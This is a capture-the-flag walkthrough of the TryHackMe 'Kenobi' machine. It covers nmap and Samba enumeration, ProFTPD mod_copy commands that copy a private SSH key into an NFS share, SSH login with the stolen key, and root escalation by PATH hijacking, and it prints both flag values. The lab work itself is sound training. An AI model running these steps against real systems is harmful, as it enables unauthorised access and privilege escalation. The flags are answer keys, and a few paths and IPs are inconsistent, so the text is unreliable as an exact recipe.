# Kenobi Try Hack Me

My IP = 10.8.19.163

Target IP = 10.10.51.195

#NMAP  
> "nmap -sC -sV -p- -T5 --script vuln 10.10.51.195"

#Grepped 'open' lines:

		21/tcp    open  ftp         ProFTPD 1.3.5 - Very vulnerable service version
		22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
		80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
		|       Slowloris tries to keep many connections to the target web server open and hold
		|       them open as long as possible.  It accomplishes this by opening connections to
		111/tcp   open  rpcbind     2-4 (RPC #100000)
		139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
		2049/tcp  open  nfs_acl     2-3 (RPC #100227)
		37039/tcp open  nlockmgr    1-4 (RPC #100021)
		39789/tcp open  mountd      1-3 (RPC #100005)
		43859/tcp open  mountd      1-3 (RPC #100005)
		55697/tcp open  mountd      1-3 (RPC #100005)

#7 ports available for communication.

#Samba Enumeration:

>	nmap scan: "nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.51.195"

	Nmap scan report for 10.10.51.195
	Host is up (0.053s latency).

	PORT    STATE SERVICE
	445/tcp open  microsoft-ds

	Host script results:
	| smb-enum-shares: 
	|   account_used: guest
	|   \\10.10.51.195\IPC$: 
	|     Type: STYPE_IPC_HIDDEN
	|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
	|     Users: 1
	|     Max Users: <unlimited>
	|     Path: C:\tmp
	|     Anonymous access: READ/WRITE
	|     Current user access: READ/WRITE
	|   \\10.10.51.195\anonymous: 
	|     Type: STYPE_DISKTREE
	|     Comment: 
	|     Users: 0
	|     Max Users: <unlimited>
	|     Path: C:\home\kenobi\share
	|     Anonymous access: READ/WRITE
	|     Current user access: READ/WRITE
	|   \\10.10.51.195\print$: 
	|     Type: STYPE_DISKTREE
	|     Comment: Printer Drivers
	|     Users: 0
	|     Max Users: <unlimited>
	|     Path: C:\var\lib\samba\printers
	|     Anonymous access: <none>
	|_    Current user access: <none>
	|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

	Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds

#How many samba shares are open? "3"

#Used smbclient

>smbclient //10.10.51.195/anonymous to see available files.

#Used smbget -R smb://10.10.51.195/anonymous
	
	Using workgroup WORKGROUP, user root
	smb://10.10.51.195/anonymous/log.txt                                                                     
	Downloaded 11.95kB in 3 seconds

#Downloaded file contained a 2048 RSA KEY rand art image:

+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

#Next nmap to see RPC Bind. Command:

	"nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.51.195"

#ProFTPd 1.3.5 has a critical vulnerability rating and its time to enumerate that vulnerability.

 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution        | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                  | linux/remote/36742.txt

These vulnerabilities allow for a attacker to copy files from and to (CPFR & CPTO) different directories on the web server. 

#MOVE Keys to and from different locations.

	Commands: nc 10.10.51.195 21

	SITE CPFR /home/kenobi.ssh/id_rsa
	SITE CPTO /var/tmp/id_rsa

	This copies the RSA key to the .var directory that is mounted and what we can see.

#Mount the machines /var to our machine.

	mkdir /mnt/kenobiNFS
	mount 10.10.159.103:/var /mnt/kenobiNFS
	
	ls -la /mnt/kenobiNFS/

	drwxr-xr-x 14 root root    4096 Sep  4  2019 ./
	drwxr-xr-x  4 root root    4096 May 14 14:38 ../
	drwxr-xr-x  2 root root    4096 Sep  4  2019 backups/
	drwxr-xr-x  9 root root    4096 Sep  4  2019 cache/
	drwxrwxrwt  2 root root    4096 Sep  4  2019 crash/
	drwxr-xr-x 40 root root    4096 Sep  4  2019 lib/
	drwxrwsr-x  2 root staff   4096 Apr 12  2016 local/
	lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock/
	drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log/
	drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail/
	drwxr-xr-x  2 root root    4096 Feb 26  2019 opt/
	lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run/
	drwxr-xr-x  2 root root    4096 Jan 29  2019 snap/
	drwxr-xr-x  5 root root    4096 Sep  4  2019 spool/
	drwxrwxrwt  6 root root    4096 May 14 14:37 tmp/
	drwxr-xr-x  3 root root    4096 Sep  4  2019 www/

	Copied SSH key to my kenobi directory.

#Login with SSH: ssh -i id_rsa kenobi@10.10.159.103

	kenobi user.txt FLAG file: d0b0f3f53b6caa532a83915e19224899

#Escalate kenobi privileges to Root.

	search for SUID binaries: "find / -perm -u=s -type f 2>/dev/null"

	/usr/bin/menu appears to be unordinary. Ran same command on my PC to see differences.

#Search for human readable lines in a binary file.

	Upgrade sh permissions to be run as root with the .usr.bin.menu file

	kenobi@kenobi:~$ echo /bin/sh > curl
	kenobi@kenobi:~$ chmod 777 curl
	kenobi@kenobi:~$ export PATH=/tmp:$PATH
	kenobi@kenobi:~$ /usr/bin/menu

	Those copies the echo/sh file and renames it curl and gains root access when ran.

	So we need to use our new "curl" to search for files on the system.

	Rewrote the files in /tmp. Ran the /usr/bin/menu command. Selected option1. Gave root shell (#).

	cd root/root.txt FLAG: 177b3cd8562289f37382721c28381f02



